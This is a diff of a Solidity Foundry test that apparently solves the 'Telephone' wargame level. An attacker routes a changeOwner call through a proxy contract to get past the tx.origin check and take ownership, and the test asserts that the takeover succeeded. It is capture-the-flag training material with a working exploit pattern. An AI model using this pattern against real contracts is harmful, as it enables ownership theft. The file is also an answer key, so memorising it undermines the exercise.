@@ -1,45 +1,58 @@
 // SPDX-License-Identifier: MIT
+
+import {LevelFactory} from "../utils/LevelFactory.sol";
+import {Telephone} from "../../src/Telephone/Level.sol";
+
 pragma solidity ^0.6.0;
 
-import "tests/Test.sol";
-import "../../src/Telephone/Level.sol";
-import "forge-std/console.sol";
-import "../utils/TelProxy.sol";
+interface ITelephone2 {
+  function changeOwner(address) external; 
+}
 
-interface ITelephone {
-    function changeOwner(address) external;
-
-    function owner() external view returns(address);
+contract TelProxy {
+  function makeACall(address telephone, address owner) external {
+    ITelephone2(telephone).changeOwner(owner);
+  }
 }
 
 interface ITelProxy {
-    function makeACall(address telephone, address owner) external;
+  function makeACall(address telephone, address owner) external;
 }
 
-contract FalloutTest is Test {
-    ITelephone telephone;
-    ITelProxy telProxy;
+interface ITelephone {
+  function changeOwner(address) external;
 
-    address deployer = address(100);
-    address attacker = address(101);
+  function owner() external view returns(address);
+}
 
-    function setUp() public {
-        vm.prank(deployer); // deploy the contract as deployer
-        telephone = ITelephone(address(new Telephone()));
-        telProxy = ITelProxy(address(new TelProxy()));
-    }
+pragma solidity ^0.6.0;
 
-    function testAttack() public {
-        /* Setup stuff, no need to touch */
-        vm.startPrank(attacker);
-        vm.deal(attacker, 5 ether);
+contract TelephoneTest is LevelFactory {
+  ITelephone telephone;
+  ITelProxy telProxy;
 
-        /* Write your code here */
-        telProxy.makeACall(address(telephone), attacker);
-        /* Write your code here */ 
+  function setUp() public {
+    vm.prank(deployer); // deploy the contract as deployer
+    telephone = ITelephone(address(new Telephone()));
+    telProxy = ITelProxy(address(new TelProxy()));
+  }
 
-        /* Validating the test */
-        assertEq(telephone.owner(), attacker);
-    }
+  function testAttack() public {
+    submitLevel("Telephone");
+  }
+
+  function _performTest() internal override {
+    telProxy.makeACall(address(telephone), attacker);
+  }
+
+  function _setupTest() internal override {
+    super._setupTest();
+  }
+
+  function _checkTest() internal override returns (bool) {
+    assertEq(telephone.owner(), attacker);
+
+    return(telephone.owner() == attacker);
+  }
 }
 
